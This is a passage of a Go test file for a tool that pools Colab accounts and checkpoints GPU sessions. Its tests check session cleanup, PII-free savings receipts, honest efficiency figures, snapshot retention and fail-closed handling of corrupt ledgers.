	stoppedCount := len(rt.stoppedSessions)
	stopCtxErr := rt.lastStopCtxErr
	hasDL := rt.lastStopHasDeadln
	rt.mu.Unlock()
	if stoppedCount == 0 {
		t.Fatalf("expected newly allocated relay session to be stopped on upload failure")
	}
	if stopCtxErr != nil {
		t.Fatalf("expected cleanup StopSession to use context.WithoutCancel(ctx), got err=%v", stopCtxErr)
	}
	if !hasDL {
		t.Fatalf("expected cleanup StopSession context to have bounded timeout deadline")
	}

	// Case B: Upload succeeds, but ResumeCommand exits with non-zero exit code -> MUST fail and clean up new VM!
	rt.customUpload = nil
	rt.mu.Lock()
	prevStopped := len(rt.stoppedSessions)
	rt.mu.Unlock()
	exitCode := 2
	rt.customExec = func(_ context.Context, req models.KernelExecRequest) (*models.KernelExecResult, error) {
		if req.CallerName == "checkpoint-relay" {
			return &models.KernelExecResult{
				Session: req.SessionID,
				Status:  "error",
				ExecutionError: &models.KernelExecError{
					Name:     "SystemExit",
					Value:    "2",
					ExitCode: &exitCode,
				},
			}, nil
		}
		return &models.KernelExecResult{Session: req.SessionID, Status: "ok"}, nil
	}
	if _, rErr := mgr.ResumeFromCheckpoint(ctx, rec.ID, models.CheckpointResumeRequest{}); rErr == nil {
		t.Fatalf("expected ResumeFromCheckpoint to fail when ResumeCommand exits non-zero")
	}
	rt.mu.Lock()
	afterStopped := len(rt.stoppedSessions)
	rt.mu.Unlock()
	if afterStopped <= prevStopped {
		t.Fatalf("expected newly allocated relay session to be cleaned up when ResumeCommand fails")
	}
}

func TestComputeSavingsReceiptStrictlyPIIFree(t *testing.T) {
	ctx := context.Background()
	dataDir := t.TempDir()

	accounts := []*models.Account{
		{
			ID:               "acc_ultra",
			Email:            "research.lead@example.org",
			Alias:            "research.lead@example.org", // Deliberately put raw email in Alias to test redaction!
			Provider:         models.ProviderColab,
			SubscriptionTier: models.TierAIUltra,
			ReferenceCycleCU: 2500,
			PaidCUBalance:    2380, // 120 CU burned (~12.4h G4)
			Health:           models.HealthHealthy,
			Enabled:          true,
		},
		{
			ID:               "acc_free_colab",
			Email:            "student.lab99@mit.edu",
			Provider:         models.ProviderColab,
			SubscriptionTier: models.TierFree,
			Health:           models.HealthHealthy,
			Enabled:          true,
		},
	}

	pool := &fakePool{accounts: accounts}
	rt := newFakeRuntime(accounts)

	// Add a Free Colab T4 session (6 hours), a 10-hour CPU session (MUST BE EXCLUDED!), and a sharded G4 experiment.
	sessFree, _ := rt.CreateSession(ctx, models.SessionAllocRequest{
		Name:               "whisper-subtitles",
		Accelerator:        models.AcceleratorT4,
		ExcludedAccountIDs: []string{"acc_ultra"},
	})
	sessCPU, _ := rt.CreateSession(ctx, models.SessionAllocRequest{
		Name:        "cpu-notebook-only",
		Accelerator: models.AcceleratorCPU,
	})
	rt.mu.Lock()
	rt.sessions[sessFree.ID].UptimeSec = 6 * 3600
	rt.sessions[sessFree.ID].BurnRateCUHr = 0
	rt.sessions[sessCPU.ID].UptimeSec = 10 * 3600
	rt.sessions[sessCPU.ID].BurnRateCUHr = 0
	rt.experiments = []*models.Experiment{
		{
			ID:            "exp_wan22_batch",
			Title:         "Wan 2.2 Evaluation",
			Accelerator:   models.AcceleratorG4,
			CUBurnedSoFar: 28.98,
			Shards: []models.ExperimentShard{
				{ShardID: 0, AccountID: "acc_ultra", AccountEmail: "research.lead@example.org", Accelerator: models.AcceleratorG4, CUBurned: 28.98},
			},
		},
	}
	rt.mu.Unlock()

	_ = rt.UploadFile(ctx, sessFree.ID, "/content/checkpoints/whisper_state.json", []byte(`{"segment":12}`))
	ckptMgr := checkpoint.NewManager(dataDir, pool, rt, nil)
	ck, err := ckptMgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{
		SessionID: sessFree.ID,
		JobID:     "job_whisper",
	})
	if err != nil {
		t.Fatalf("SyncSessionCheckpoint: %v", err)
	}
	if _, err := ckptMgr.ResumeFromCheckpoint(ctx, ck.ID, models.CheckpointResumeRequest{}); err != nil {
		t.Fatalf("ResumeFromCheckpoint: %v", err)
	}

	st := &fakeWasteStore{
		waste: models.SavedWasteStats{
			SavedIdleWasteCU:   38.64,
			AutoTeardownsCount: 6,
			ZombieAbortsCount:  2,
		},
	}

	stats, err := checkpoint.ComputeSavingsReceipt(ctx, st, pool, rt, ckptMgr)
	if err != nil {
		t.Fatalf("ComputeSavingsReceipt failed: %v", err)
	}

	if stats.TotalAccounts != 2 {
		t.Fatalf("expected 2 Colab accounts, got %d", stats.TotalAccounts)
	}
	// Must be ~6.0h (Free Colab T4) and MUST NOT include the 10h CPU session!
	if math.Abs(stats.FreeGPUHoursHarvested-6.0) > 0.1 {
		t.Fatalf("expected FreeGPUHoursHarvested == 6.0 (excluding 10h CPU session), got %v", stats.FreeGPUHoursHarvested)
	}
	if stats.AutoResumeRelays != 1 {
		t.Fatalf("expected AutoResumeRelays=1, got %d", stats.AutoResumeRelays)
	}
	// Vast.ai / RunPod 2026 avg benchmark ($2.20 large / $0.60 mid / $0.25 T4) yields ~$38+ here.
	if stats.EstimatedSavedUSD <= 25 {
		t.Fatalf("expected substantial EstimatedSavedUSD > $25 at Vast.ai/RunPod avg rates, got %v", stats.EstimatedSavedUSD)
	}
	expectedCNY := math.Round(stats.EstimatedSavedUSD*7.2*100) / 100
	if math.Abs(stats.EstimatedSavedCNY-expectedCNY) > 0.02 {
		t.Fatalf("expected EstimatedSavedCNY=%v, got %v", expectedCNY, stats.EstimatedSavedCNY)
	}
	if stats.RankBadgeZh != "🏆 算力白嫖宗师" {
		t.Fatalf("expected grandmaster rank badge, got %q", stats.RankBadgeZh)
	}
	if stats.ShareCopyZh == "" || stats.ShareCopyEn == "" {
		t.Fatalf("expected ready-to-paste bilingual share copy")
	}

	// Strictly verify ZERO raw email addresses anywhere in the serialized JSON!
	rawJSON, err := json.Marshal(stats)
	if err != nil {
		t.Fatalf("json.Marshal(stats): %v", err)
	}
	serialized := string(rawJSON)
	for _, forbidden := range []string{
		"@",
		"research.lead",
		"student.lab99",
		"admin@secret.org",
		"gmail.com",
		"protonmail.com",
		"mit.edu",
	} {
		if strings.Contains(strings.ToLower(serialized), strings.ToLower(forbidden)) {
			t.Fatalf("PII LEAK DETECTED: found %q inside SavingsReceiptStats JSON: %s", forbidden, serialized)
		}
	}
}

func TestComputeSavingsReceiptHonestZeroUsageAndCPUExclusion(t *testing.T) {
	ctx := context.Background()

	// 1. Fresh pool with accounts connected but ZERO usage -> WasteZeroEfficiencyPct MUST be 0 (never fake 95%).
	freshAccounts := []*models.Account{
		{ID: "acc_f1", Email: "f1@example.com", Provider: models.ProviderColab, SubscriptionTier: models.TierFree, Health: models.HealthHealthy, Enabled: true},
		{ID: "acc_f2", Email: "f2@example.com", Provider: models.ProviderColab, SubscriptionTier: models.TierPro, Health: models.HealthHealthy, Enabled: true},
	}
	freshPool := &fakePool{accounts: freshAccounts}
	freshRT := newFakeRuntime(freshAccounts)

	zeroStats, err := checkpoint.ComputeSavingsReceipt(ctx, nil, freshPool, freshRT, nil)
	if err != nil {
		t.Fatalf("ComputeSavingsReceipt(zero): %v", err)
	}
	if zeroStats.WasteZeroEfficiencyPct != 0 {
		t.Fatalf("expected honest WasteZeroEfficiencyPct == 0 with no usage (no fake 95%% default), got %v", zeroStats.WasteZeroEfficiencyPct)
	}
	if zeroStats.TotalGPUHours != 0 || zeroStats.FreeGPUHoursHarvested != 0 || zeroStats.EstimatedSavedUSD != 0 {
		t.Fatalf("expected all zero GPU hours/savings with no usage, got %+v", zeroStats)
	}

	// 2. Pure CPU session (12 hours) MUST NOT add GPU hours, free GPU hours, or GPU rental savings.
	cpuSess, _ := freshRT.CreateSession(ctx, models.SessionAllocRequest{Name: "cpu-only", Accelerator: models.AcceleratorCPU})
	freshRT.mu.Lock()
	freshRT.sessions[cpuSess.ID].UptimeSec = 12 * 3600
	freshRT.sessions[cpuSess.ID].BurnRateCUHr = 0
	freshRT.mu.Unlock()

	cpuOnlyStats, err := checkpoint.ComputeSavingsReceipt(ctx, nil, freshPool, freshRT, nil)
	if err != nil {
		t.Fatalf("ComputeSavingsReceipt(cpu-only): %v", err)
	}
	if cpuOnlyStats.TotalGPUHours != 0 || cpuOnlyStats.FreeGPUHoursHarvested != 0 || cpuOnlyStats.EstimatedSavedUSD != 0 {
		t.Fatalf("CPU-only sessions MUST be excluded from GPU savings hours, got %+v", cpuOnlyStats)
	}
	if cpuOnlyStats.WasteZeroEfficiencyPct != 0 {
		t.Fatalf("expected WasteZeroEfficiencyPct == 0 for CPU-only sessions, got %v", cpuOnlyStats.WasteZeroEfficiencyPct)
	}

	// 3. Real paid burn (100 CU) with modest saved waste (10 CU) and 0 free hours ->
	//    efficiency MUST be honest 10/(100+10) = 9.1% (NO fake 86% floor!).
	paidAccounts := []*models.Account{
		{
			ID:               "acc_paid",
			Email:            "paid@example.com",
			Provider:         models.ProviderColab,
			SubscriptionTier: models.TierPro,
			ReferenceCycleCU: 200,
			PaidCUBalance:    100, // 100 CU burned
			Health:           models.HealthHealthy,
			Enabled:          true,
		},
	}
	paidPool := &fakePool{accounts: paidAccounts}
	paidRT := newFakeRuntime(paidAccounts)
	paidStore := &fakeWasteStore{
		waste: models.SavedWasteStats{SavedIdleWasteCU: 10},
	}
	honestStats, err := checkpoint.ComputeSavingsReceipt(ctx, paidStore, paidPool, paidRT, nil)
	if err != nil {
		t.Fatalf("ComputeSavingsReceipt(paid): %v", err)
	}
	if math.Abs(honestStats.WasteZeroEfficiencyPct-9.1) > 0.1 {
		t.Fatalf("expected honest measured WasteZeroEfficiencyPct == 9.1 (no fake 86%% floor), got %v", honestStats.WasteZeroEfficiencyPct)
	}
}

func TestPartialCheckpointDepthLimitFailsAndProtectsCompleteSnapshot(t *testing.T) {
	ctx := context.Background()
	dataDir := t.TempDir()
	accounts := []*models.Account{
		{ID: "acc_depth", Email: "depth@example.com", SubscriptionTier: models.TierFree, Health: models.HealthHealthy, Enabled: true},
	}
	pool := &fakePool{accounts: accounts}
	rt := newFakeRuntime(accounts)
	mgr := checkpoint.NewManager(dataDir, pool, rt, nil)

	// Retain only 1 snapshot per job so a broken partial snapshot WOULD destroy the only good copy if marked synced!
	if _, err := mgr.UpdatePolicy(models.CheckpointPolicy{
		AutoResumeEnabled:  true,
		SyncIntervalSec:    60,
		MaxSnapshotsPerJob: 1,
		WatchPaths:         []string{"/content/checkpoints"},
	}); err != nil {
		t.Fatalf("UpdatePolicy: %v", err)
	}

	sess, err := rt.CreateSession(ctx, models.SessionAllocRequest{Name: "depth-test", Accelerator: models.AcceleratorT4})
	if err != nil {
		t.Fatalf("CreateSession: %v", err)
	}

	// 1. Sync a valid complete snapshot first.
	_ = rt.UploadFile(ctx, sess.ID, "/content/checkpoints/epoch1.pt", []byte("COMPLETE_SNAPSHOT"))
	goodRec, err := mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{
		SessionID: sess.ID,
		JobID:     "job_depth_guard",
	})
	if err != nil || goodRec.Status != "synced" {
		t.Fatalf("initial valid sync failed: rec=%+v err=%v", goodRec, err)
	}

	// 2. Add a nested directory exceeding maxRemoteWalkDepth (depth 4: /d1/d2/d3/d4/deep.bin).
	//    SyncSessionCheckpoint MUST return an explicit error (NEVER mark partial snapshot `synced`
	//    and NEVER prune the previous complete snapshot!).
	_ = rt.UploadFile(ctx, sess.ID, "/content/checkpoints/d1/d2/d3/d4/deep.bin", []byte("TOO_DEEP"))
	if _, err := mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{
		SessionID: sess.ID,
		JobID:     "job_depth_guard",
	}); err == nil {
		t.Fatalf("expected SyncSessionCheckpoint to fail when directory exceeds maximum walk depth")
	}

	// Verify the only complete snapshot is STILL intact in metadata AND on disk!
	latest, ok := mgr.LatestCheckpointForJob("job_depth_guard")
	if !ok || latest == nil || latest.ID != goodRec.ID {
		t.Fatalf("expected previous complete snapshot %q to remain untouched, got %+v", goodRec.ID, latest)
	}
	if _, statErr := os.Stat(filepath.Join(goodRec.LocalSnapshotDir, "epoch1.pt")); statErr != nil {
		t.Fatalf("expected complete snapshot file on disk to survive failed deep sync: %v", statErr)
	}
}

func TestComputeSavingsReceiptPropagatesTelemetryErrors(t *testing.T) {
	ctx := context.Background()
	baseAccounts := []*models.Account{
		{ID: "acc_tel", Email: "tel@example.com", Provider: models.ProviderColab, SubscriptionTier: models.TierFree, Health: models.HealthHealthy, Enabled: true},
	}

	cases := []struct {
		name string
		call func() (*models.SavingsReceiptStats, error)
	}{
		{
			name: "pool.ListAccounts error",
			call: func() (*models.SavingsReceiptStats, error) {
				p := &fakePool{accounts: baseAccounts, listAccountsErr: errors.New("vault locked")}
				rt := newFakeRuntime(baseAccounts)
				st := &fakeWasteStore{}
				return checkpoint.ComputeSavingsReceipt(ctx, st, p, rt, nil)
			},
		},
		{
			name: "rt.ListSessions error",
			call: func() (*models.SavingsReceiptStats, error) {
				p := &fakePool{accounts: baseAccounts}
				rt := newFakeRuntime(baseAccounts)
				rt.listSessionsErr = errors.New("runtime telemetry offline")
				st := &fakeWasteStore{}
				return checkpoint.ComputeSavingsReceipt(ctx, st, p, rt, nil)
			},
		},
		{
			name: "st.ListSessions error",
			call: func() (*models.SavingsReceiptStats, error) {
				p := &fakePool{accounts: baseAccounts}
				rt := newFakeRuntime(baseAccounts)
				st := &fakeWasteStore{listSessionsErr: errors.New("sqlite disk I/O error")}
				return checkpoint.ComputeSavingsReceipt(ctx, st, p, rt, nil)
			},
		},
		{
			name: "st.GetSavedWasteStats error",
			call: func() (*models.SavingsReceiptStats, error) {
				p := &fakePool{accounts: baseAccounts}
				rt := newFakeRuntime(baseAccounts)
				st := &fakeWasteStore{wasteErr: errors.New("waste ledger corrupted")}
				return checkpoint.ComputeSavingsReceipt(ctx, st, p, rt, nil)
			},
		},
	}

	for _, tc := range cases {
		stats, err := tc.call()
		if err == nil {
			t.Fatalf("%s: expected error propagation, got nil error and partial stats=%+v", tc.name, stats)
		}
		if stats != nil {
			t.Fatalf("%s: expected nil stats on telemetry error, got %+v", tc.name, stats)
		}
	}
}

func TestCorruptCheckpointLedgerFailsSavingsReceipt(t *testing.T) {
	ctx := context.Background()
	dataDir := t.TempDir()
	ckptDir := filepath.Join(dataDir, "checkpoints")
	if err := os.MkdirAll(ckptDir, 0o700); err != nil {
		t.Fatalf("mkdir checkpoints: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ckptDir, "records.json"), []byte("{corrupt-json"), 0o600); err != nil {
		t.Fatalf("write corrupt records.json: %v", err)
	}

	accounts := []*models.Account{
		{ID: "acc_corrupt", Email: "corrupt@example.org", SubscriptionTier: models.TierFree, Health: models.HealthHealthy, Enabled: true},
	}
	p := &fakePool{accounts: accounts}
	rt := newFakeRuntime(accounts)
	st := &fakeWasteStore{}

	mgr := checkpoint.NewManagerWithConfig(checkpoint.Config{DataDir: dataDir, DemoMode: false}, p, rt, nil)
	if mgr.LedgerError() == nil {
		t.Fatalf("expected non-nil LedgerError() when records.json is corrupt")
	}

	stats, err := checkpoint.ComputeSavingsReceipt(ctx, st, p, rt, mgr)
	if err == nil || stats != nil {
		t.Fatalf("expected ComputeSavingsReceipt to fail closed on corrupt checkpoint ledger, got stats=%+v err=%v", stats, err)
	}

	// Also reject `null`, `{}`, `{"records":null}`, and malformed elements like `{"records":[null,{}]}` as corrupt ledgers!
	for _, badBody := range []string{"null", "{}", `{"records":null}`, `{"records":[null,{}]}`} {
		subDir := t.TempDir()
		cDir := filepath.Join(subDir, "checkpoints")
		_ = os.MkdirAll(cDir, 0o700)
		_ = os.WriteFile(filepath.Join(cDir, "records.json"), []byte(badBody), 0o600)
		mBad := checkpoint.NewManagerWithConfig(checkpoint.Config{DataDir: subDir, DemoMode: false}, p, rt, nil)
		if mBad.LedgerError() == nil {
			t.Fatalf("expected LedgerError() != nil for invalid ledger %s", badBody)
		}
	}

	// Verify MaxSnapshotsPerJob=1 retains 1 snapshot PER (JobID, RemotePath) without pruning sibling paths!
	retDir := t.TempDir()
	retMgr := checkpoint.NewManagerWithConfig(checkpoint.Config{DataDir: retDir, DemoMode: true}, p, rt, nil)
	pol := retMgr.GetPolicy()
	pol.MaxSnapshotsPerJob = 1
	if _, err := retMgr.UpdatePolicy(pol); err != nil {
		t.Fatalf("UpdatePolicy: %v", err)
	}
	sess, _ := rt.CreateSession(ctx, models.SessionAllocRequest{Accelerator: models.AcceleratorT4})
	if _, err := retMgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{
		SessionID:  sess.ID,
		JobID:      "app_multi",
		JobTitle:   "Multi Path",
		JobKind:    "app",
		RemotePath: "/content",
	}); err != nil {
		t.Fatalf("sync /content: %v", err)
	}
	if _, err := retMgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{
		SessionID:  sess.ID,
		JobID:      "app_multi",
		JobTitle:   "Multi Path",
		JobKind:    "app",
		RemotePath: "/content/outputs",
	}); err != nil {
		t.Fatalf("sync /content/outputs: %v", err)
	}
	keptPaths := make(map[string]bool)
	for _, rec := range retMgr.ListCheckpoints() {
		if rec.JobID == "app_multi" {
			keptPaths[rec.RemotePath] = true
		}
	}
	if !keptPaths["/content"] || !keptPaths["/content/outputs"] {
		t.Fatalf("expected MaxSnapshotsPerJob=1 to preserve BOTH /content and /content/outputs, got %+v", keptPaths)
	}
}
